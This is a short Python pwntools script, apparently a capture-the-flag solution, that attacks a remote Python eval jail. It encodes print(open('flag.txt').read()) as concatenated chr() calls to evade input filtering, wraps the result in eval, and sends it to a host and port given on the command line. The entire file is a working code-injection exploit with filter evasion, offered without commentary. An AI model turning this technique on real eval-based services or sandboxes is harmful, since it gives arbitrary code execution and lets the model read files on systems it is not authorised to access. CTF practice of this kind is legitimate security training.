from pwn import *
import sys


def encode(letters):
    output = ""
    for letter in letters:
        output += "chr(" + str(ord(letter)) + ")+"
    return output.strip("+")


enc = encode("print(open('flag.txt').read())")
# print("eval("+enc+") + 2381236487346532754754875487548732891781711524356321")

solution_string = "eval(chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(41)) + 2381236487346532754754875487548732891781711524356321"


if __name__ == '__main__':
    _, hostname, port = sys.argv[-1].split(" ")
    print("\n".join(sys.argv))
    conn = remote(hostname, port)
    conn.recvuntil(">>>", timeout=15)
    conn.sendline(solution_string)
    print(conn.recvall())
